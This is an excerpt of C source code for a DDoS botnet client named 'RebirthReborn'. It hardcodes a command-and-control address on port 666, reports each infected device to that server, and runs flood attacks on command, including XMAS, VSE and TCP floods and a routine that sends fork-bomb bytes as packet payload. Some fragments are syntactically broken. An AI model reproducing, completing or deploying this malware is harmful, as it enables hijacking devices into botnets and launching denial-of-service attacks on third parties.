...
#define SERVER_LIST_SIZE (sizeof(ceoServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
...
unsigned char *ceoServer[] = {"23.160.193.184:666"};

int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int ceoSocket = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint64_t numpids = 0;
...
int recvLine(int socket, unsigned char *buf, int bufsize)
{
        ...
        while(bufsize-- > 1)
        {
                if(recv(ceoSocket, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
...
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "", &vse_payload_len;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
...
void astd(unsigned char *ip, int port, int secs, int packetsize) 
{
        ...
        {         //change it if u want
                char *hexstrings[] = {
                    "\x3a\x28\x29\x7b\x20\x3a\x7c\x3a\x26\x20\x7d\x3b\x3a\x0a",
                    "\x3a\x28\x29\x7b\x20\x3a\x7c\x3a\x26\x20\x7d\x3b\x3a\x0a",
                    "\x3a\x28\x29\x7b\x20\x3a\x7c\x3a\x26\x20\x7d\x3b\x3a\x0a",
                    "\x3a\x28\x29\x7b\x20\x3a\x7c\x3a\x26\x20\x7d\x3b\x3a\x0a",
                    "\x3a\x28\x29\x7b\x20\x3a\x7c\x3a\x26\x20\x7d\x3b\x3a\x0a",
...
char *defopsys() {
    ...
    return "RaspberryPi";
    #elif defined(__IS_IPHONE__)
    return "IPhone";
    #elif defined(__IS_IPAD__)
    return "IPad";
    else
    return "Unknown"
    #endif
...
void cncinput(int argc, unsigned char * argv[]) {
  ...
  if (!strcmp(argv[0], "XMAS")) {
    if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32) {
      return;
    }
    ...
    if (strstr(ip, ",") != NULL) {
      ...
      while (hi != NULL) {
        if (!listFork()) {
          rtcp(hi, port, time, spoofed, packetsize, pollinterval);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
      ...
      if (!listFork()) {
        rtcp(ip, port, time, spoofed, packetsize, pollinterval);
        _exit(0);
      }
    }
    return;
...
int initConnection()
{
        ...
        memset(server, 0, 512);
        if(ceoSocket) { close(ceoSocket); ceoSocket = 0; }
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;

        strcpy(server, ceoServer[currentServer]);
        int port = 666;
        ...
        ceoSocket = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(ceoSocket, server, port, 30)) return 1;
...
int main(int argc, unsigned char *argv[])
{
        ...
        while(1)
        {
                ...
                sockprintf(ceoSocket, "\x1b[1;31m[\033[1;36m%s\033[1;31m] \033[1;31mJoined RebirthReborn As [\033[1;37m%s\033[1;31m]", inet_ntoa(ourIP), defarchs());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(ceoSocket, commBuf, 4096)) != -1)
                {
